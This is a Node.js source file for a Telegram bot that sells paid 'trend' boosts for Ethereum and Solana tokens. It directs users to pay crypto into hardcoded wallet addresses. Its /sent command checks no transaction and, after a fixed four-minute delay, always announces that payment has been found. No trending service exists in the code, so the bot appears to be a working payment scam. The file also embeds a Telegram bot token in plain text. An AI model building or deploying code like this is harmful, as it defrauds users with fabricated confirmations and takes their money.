const TelegramBot = require('node-telegram-bot-api');
const keep_alive = require('./keep_alive.js');

// Replace with your bot's token
const token = '8198239466:AAF65GgEK2EQfDaBpXPBg13deuNM543Sbks';

// Exchange rates
const SOL_TO_NGN = 236953; // 1 SOL in NGN
const NGN_TO_ETH = 0.0599 / 3952472; // ETH per NGN

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Store user data
const userData = {};

// Helper function to validate token address
function isValidTokenAddress(address) {
    // Basic validation for Ethereum or Solana address length
    return address.length === 42 || address.length === 44;
}

// Helper function to validate project template
function isValidProjectTemplate(template) {
    return template.trim().split(/\s+/).length >= 3;
}

// Listener for the '/start' command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Define the message options with the button
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'TREND', // Button text
                        callback_data: 'trend_clicked', // Data sent back when button is clicked
                    },
                ],
            ],
        },
    };

    // Send the message with the button
    bot.sendMessage(chatId, 'Trend on MICRO BUY', options);
});

// Listener for the 'TREND' button click
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (callbackQuery.data === 'trend_clicked') {
        // Ask for the blockchain choice
        const blockchainOptions = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: 'ETHEREUM',
                            callback_data: 'blockchain_ETHEREUM',
                        },
                        {
                            text: 'SOLANA',
                            callback_data: 'blockchain_SOLANA',
                        },
                    ],
                ],
            },
        };

        bot.sendMessage(chatId, 'What blockchain do you wish to trend?', blockchainOptions);
    }

    // Handle blockchain choices
    if (callbackQuery.data.startsWith('blockchain_')) {
        const selectedBlockchain = callbackQuery.data.split('_')[1]; // Get the blockchain name
        userData[chatId] = { blockchain: selectedBlockchain }; // Store selected blockchain

        bot.sendMessage(chatId, `You chose to trend on: ${selectedBlockchain}. Please provide your token contract address:`);
    }

    // Handle price range selection
    if (callbackQuery.data.startsWith('duration_')) {
        const blockchain = userData[chatId]?.blockchain;

        // Define wallet addresses based on the selected blockchain
        let walletAddress;
        if (blockchain === 'SOLANA') {
            walletAddress = 'DjupWkwVjNR2LDYPaSCviYZZ7SBQj42PECvDVmiPjD8q';
        } else if (blockchain === 'ETHEREUM') {
            walletAddress = '0xb25AAD6AB9ad26d4A6d1678D1983afBd86aD52f9';
        }

        // Send the payment instruction message with double line breaks
        const paymentMessage = `Add FUNDS to your wallet\n\nPlease make payment to this wallet address:\n\n${walletAddress}\n\nHit /sent to confirm payment/transaction.`;
        bot.sendMessage(chatId, paymentMessage);
    }
});

// Handle messages for token address and project template
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Handle token contract address input
    if (userData[chatId]?.blockchain && !userData[chatId]?.tokenAddress) {
        if (isValidTokenAddress(text)) {
            userData[chatId].tokenAddress = text; // Store token address
            bot.sendMessage(chatId, 'Thank you! Now, please provide your project template:');
        } else {
            bot.sendMessage(chatId, 'Invalid token address. Please provide a valid one.');
        }
    }
    // Handle project template input
    else if (userData[chatId]?.tokenAddress && !userData[chatId]?.projectTemplate) {
        if (isValidProjectTemplate(text)) {
            userData[chatId].projectTemplate = text; // Store project template

            // After receiving the project template, confirm the trend and offer the BOOST option
            const boostOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'START TREND', // Button text
                                callback_data: 'boost_trend', // Data sent back when button is clicked
                            },
                        ],
                    ],
                },
            };

            // Send message with two line spaces after "Great! Trend started."
            bot.sendMessage(chatId, 'Great! Start Trend.\n\nGet started with Micro Buy', boostOptions);
        } else {
            bot.sendMessage(chatId, 'Invalid project template. Please enter at least three words.\n\nYou can add up your social links as well if valid (not recommended)');
        }
    }
});

// Listener for 'BOOST TREND' button click
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (callbackQuery.data === 'boost_trend') {
        const blockchain = userData[chatId]?.blockchain;

        // Set price ranges and durations based on the selected blockchain
        let price1, price2, price3, price4, price5;

        if (blockchain === 'SOLANA') {
            price1 = `4 SOL - 5hrs`;
            price2 = `3.5 SOL - 4hrs`;
            price3 = `3 SOL - 3hrs`;
            price4 = `2.5 SOL - 2hrs`;
            price5 = `1.5 SOL - 1hrs`;
        } else if (blockchain === 'ETHEREUM') {

            price1 = `0.27481173 ETH - 5hrs`;
            price2 = `0.24028331 ETH - 4hrs`;
            price3 = `0.20571345 ETH - 3hrs`;
            price4 = `0.17104172 ETH - 2hrs`;
            price5 = `0.102856725 ETH - 14hrs`;
        }

        // Show duration options with price in the selected blockchain
        const durationOptions = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: price1, callback_data: 'duration_2hrs' }],
                    [{ text: price2, callback_data: 'duration_5hrs' }],
                    [{ text: price3, callback_data: 'duration_8hrs' }],
                    [{ text: price4, callback_data: 'duration_17hrs' }],
                    [{ text: price5, callback_data: 'duration_24hrs' }],
                ],
            },
        };

        bot.sendMessage(chatId, 'Choose a duration to boost your trend:', durationOptions);
    }
});

// Listener for the '/sent' command
bot.onText(/\/sent/, (msg) => {
    const chatId = msg.chat.id;

    // Send no transactions found message
    bot.sendMessage(chatId, `No transactions found.\n\nplease provide the tx hash of your transaction, \n\n it is advisable to wait a few minutes after transactions has been made, \n\nthank you for your patience.`);

    // Wait 1 minute (60000 milliseconds) and then send confirmation message
    setTimeout(() => {
        bot.sendMessage(chatId, `Transaction has been found!\n\nTrend will begin shortly, thanks for choosing @micr0buybot\n\n/start`);
    }, 240000);
});
